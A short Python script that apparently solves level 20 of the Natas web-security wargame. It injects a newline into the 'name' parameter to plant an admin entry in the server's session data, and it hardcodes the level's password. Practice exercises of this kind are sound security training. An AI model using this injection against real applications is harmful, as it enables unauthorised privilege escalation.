# -*- coding: utf-8 -*-
from base import get_page, post_page
import re
from time import sleep
from urllib.parse import quote

def natas20():
    username="natas20"
    password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"
    name = quote("admin\nadmin 1")
    content = get_page(20, username, password, f"?debug&name={name}", cookies = {'hack': 'hack'})
    print(content)

if __name__ == "__main__":
    natas20()